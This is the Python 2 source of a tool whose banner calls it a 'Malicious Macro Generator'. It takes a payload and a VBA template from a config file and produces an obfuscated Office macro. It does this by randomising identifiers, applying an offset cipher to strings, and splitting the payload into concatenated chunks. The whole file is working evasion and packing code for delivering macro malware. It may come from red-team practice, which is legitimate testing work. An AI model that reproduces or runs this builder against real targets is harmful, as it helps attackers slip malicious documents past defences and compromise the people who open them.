import sys
import random
import string 
import os
import re
import json

def load_config(filename):
	config = load_data(filename)
	items = {}
	try:
		items = json.loads(config)
	except:
		print "[-] \"%s\" is not a valid config file." % filename
		exit(0)
	return items

def get_config(config, key):
	if config.has_key(key):
		return config[key]
	else:
		print "[-] \"%s\" not found in the config file." % key
		exit(0)
		
def get_config_vars(config):
	vars =get_config(config, "encodedvars")
	return vars
	
def show_description(config):
	description = get_config(config, "description")
	print "[*] Payload: %s" % description

def gen_var(size):
	return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))

def gen_int(size):
	return ''.join(random.SystemRandom().choice(string.digits) for _ in range(size))
	
def randomize_vars(buffer, vars, iter):
	for var in vars:
		for i in reversed(range(1, iter)):
			buffer = buffer.replace(var + str(i), gen_var(random.randrange(5, 20)))
	return buffer

def randomize_int(buffer, var, min, max, iter):
	for i in reversed(range(1, iter)):
		buffer = buffer.replace("[" + var + str(i) +  "]", gen_int(random.randrange(min, max)))
	return buffer

def encode_data(buffer, offset):
	data = ""
	for c in buffer:
		data += chr(ord(c) + int(offset))
	return data
	
def encode_config_vars(buffer, vars, offset):
	for var in vars.keys():
		buffer = replace_var_encode(buffer, var, vars[var], offset)
	return buffer
		
def replace_var_encode(buffer, var, data, offset):
	encoded = encode_data(data, offset)
	buffer = buffer.replace("[" + var + "]", encoded)
	return buffer
	
def replace_var(buffer, var, data):
	buffer = buffer.replace("[" + var + "]", str(data))
	return buffer
	
def gen_chunk(buffer, payload, offset):
	payload = encode_data(payload, offset)
	vars = "Dim " + gen_var(random.randrange(5, 20)) + " As String\r\n"
	args = ""
	size = 0	
	
	for item in re.findall("." * 200, payload):
		current_var = gen_var(random.randrange(5, 20))
		vars += "\tDim " + current_var + " As String\r\n"
		vars += "\t" + current_var + " = \"" + item + "\"\r\n" 
		
		args += current_var + " & "
		size += 200
		
	if len(payload) > size:
		current_var = gen_var(random.randrange(5, 20))
		vars += "\tDim " + current_var + " As String\r\n"
		vars += "\t" + current_var + " = \"" + payload[(len(payload) - size) * -1:] + "\"\r\n" 
		args += current_var
	else:
		args = args[:-3]

	return buffer.replace("[PAYLOAD]", vars).replace("[PAYLOAD_ARGS]", args)

def load_data(filename):
	if os.path.exists(filename):
		buffer = open(filename, "rb").read()
		return buffer
	else:
		print "[-] \"%s\" file not found." % filename
		exit(0)

def save_macro(filename, buffer):
	try:
		open(filename, "wb").write(buffer)
	except:
		print "[-] Failed to save \"%s\"" % filename
		exit(0)
	print "[*] Saving \"%s\" as the final macro" % filename
	
def banner():
	print "Malicious Macro Generator V1.1 - RingZer0 Team\nAuthor: Mr.Un1k0d3r charles.hamilton@mandiant.com\n"
	
def help():
	print "Usage: %s [config] [output]\n\n\tconfig\tConfig file that contain generator information\n\toutput\tOutput filename for the macro" % sys.argv[0]
		
if __name__ == "__main__":
	config = ""
	data = ""
	iter = 0
	vars = ["var", "func", "data", "cond", "int"]
	offset = 0
	domain = ""
	
	banner()
	
	if len(sys.argv) < 3:
		help()
		exit(0)
	
	config = load_config(sys.argv[1])
	show_description(config)
	offset = int(get_config(config, "encodingoffset"))
	data = load_data(get_config(config, "template"))
	iter = int(get_config(config, "varcount"))
	data = replace_var(data, "OFFSET", offset)
	
	data = randomize_int(data, "SMALLINT", 1, 2, iter)
	data = randomize_int(data, "INT", 2, 5, iter)
	data = randomize_vars(data, vars, iter)
	
	template_vars = get_config_vars(config)
	data = encode_config_vars(data, template_vars, offset)
	
	data = gen_chunk(data, get_config(config, "payload"), offset)
	
	save_macro(sys.argv[2], data)
	
	print "[*] Macro generation is completed"
